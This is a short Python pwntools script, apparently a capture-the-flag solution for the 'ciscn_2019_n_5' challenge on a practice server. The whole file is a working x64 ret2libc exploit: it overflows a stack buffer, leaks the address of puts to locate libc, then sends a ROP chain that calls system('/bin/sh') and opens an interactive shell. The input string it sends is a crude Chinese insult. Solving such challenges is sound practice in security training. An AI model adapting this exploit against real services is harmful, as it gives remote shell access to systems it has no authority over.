#Made by fly_autumn
#x64 ret2libc
from pwn import *
#p = process("./ciscn_2019_n_5")
p = remote("node5.buuoj.cn",26288)
elf = ELF("./ciscn_2019_n_5")
context(os="linux",arch="amd64")
libc = ELF("./libc.so.6")

start_plt = 0x400540
offset = 40
pop_rdi = 0x400713
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
ret = 0x4004c9

p.recvuntil(b"name\n")
p.sendline(b"shabi")
p.recvuntil(b"me?\n")
payload = b"\x00" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_plt)
p.sendline(payload)

puts_addr = u64(p.recv(6).ljust(8,b"\0"))
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

p.recvuntil(b"name\n")
p.sendline(b"shabi")
p.recvuntil(b"me?\n")
payload2 = b"\x00" * offset + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
p.sendline(payload2)

p.interactive()
